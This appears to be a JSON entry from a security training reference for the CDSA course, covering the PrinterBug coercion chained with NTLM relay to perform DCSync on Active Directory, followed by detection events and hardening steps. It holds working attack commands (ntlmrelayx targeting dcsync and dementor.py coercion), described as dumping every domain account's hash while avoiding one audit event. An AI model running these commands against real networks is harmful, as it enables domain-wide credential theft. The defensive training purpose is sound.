      "id": "cdsa-m06-print-spooler-ntlm-relay",
      "name": "Print Spooler Bug + NTLM Relay (DCSync via PrinterBug)",
      "command": "impacket-ntlmrelayx -t dcsync://<dc2_ip> -smb2support",
      "description": "The PrinterBug (2018) forces any Windows machine with Print Spooler enabled to authenticate to an attacker-controlled machine. Combined with NTLMRelayx, relay the DC's credential to another DC to perform DCSync without 4662 events. Requires SMB Signing disabled on target DC. Detection: Event 4624 for DC$ account originating from unexpected IP.",
      "platform": "linux",
      "type": "attack-chain",
      "opsec": "loud",
      "category": "Active Directory Defense",
      "subcategory": "Coercion Attacks",
      "certifications": [
        "CDSA"
      ],
      "source": "CDSA Module 06: Windows Attacks & Defense",
      "tags": [
        "printerbug",
        "ntlm-relay",
        "print-spooler",
        "dcsync",
        "impacket",
        "dementor",
        "coercion",
        "active-directory",
        "blue-team"
      ],
      "mitre": [
        "T1187",
        "T1003.006",
        "T1557.001"
      ],
      "notes": "PrinterBug: abuses RpcRemoteFindFirstPrinterChangeNotification(Ex)\n  → Any domain user can force RemoteServer$ to authenticate to any machine\n  → Microsoft stance: 'by design', will not be fixed\n  → Result: reverse auth carrying TGT (NTLM or Kerberos depending on config)\n\nPrerequisites:\n  → Print Spooler service running on target DC\n  → SMB Signing disabled on target DC (for relay to work)\n  → Attacker controls listener machine reachable from target DC\n\nLab setup:\n  → Kali (<KALI_IP>) runs NTLMRelayx + dementor.py\n  → DC1 (<DC1_IP>) has Print Spooler enabled\n  → DC2 (<DC2_IP>) is the relay target (SMB Signing off)\n\n=== ATTACK ===\n# Terminal 1 (Kali): Start NTLMRelayx targeting DC2 for DCSync\nimpacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support\n  → Waits for incoming NTLM auth from DC1\n  → When DC1 authenticates, relays to DC2 as DC1 and performs DCSync\n\n# Terminal 2 (Kali): Trigger PrinterBug — force DC1 to connect back to Kali\npython3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>\n  → <USER>: any valid domain user (e.g., bob)\n  → Expected error: RPC_S_INVALID_NET_ADDR (0x6ab) — normal, attack still works\n\n# Terminal 1: Observe DCSync output\n  → Hashes for all domain accounts are dumped\n  → No Event 4662 generated (relay impersonates DC, not a user)\n\n=== DETECTION ===\nEvent 4624: Successful logon\n  → DC1$ (computer account) logging in from Kali's IP (<KALI_IP>)\n  → DC$ accounts should ONLY authenticate from DC IP addresses\n  → Any DC$ logon from non-DC IP = critical alert\n\nNetwork-based detection:\n  → Unusual outbound connections from DC to port 445 toward non-DC IPs\n  → Block outbound 139/445 from DC to non-DC machines\n\n=== PREVENTION ===\n  → Disable Print Spooler on all non-print servers\n  → Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\n              RegisterSpoolerRemoteRpcEndPoint = 2 (disable remote RPC endpoint)\n              (value 1 = enabled, 2 = disabled — blocks remote coercion while keeping local printing)\n  → Enable SMB Signing on all Domain Controllers\n  → Block outbound TCP 139/445 from DCs to non-DC machines",
      "examples": [
        {
          "label": "Start NTLMRelayx targeting DC2 for DCSync (Terminal 1)",
          "command": "impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support"
        },
        {
          "label": "Trigger PrinterBug — coerce DC1 to connect to Kali (Terminal 2)",
          "command": "python3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
        }
      ],
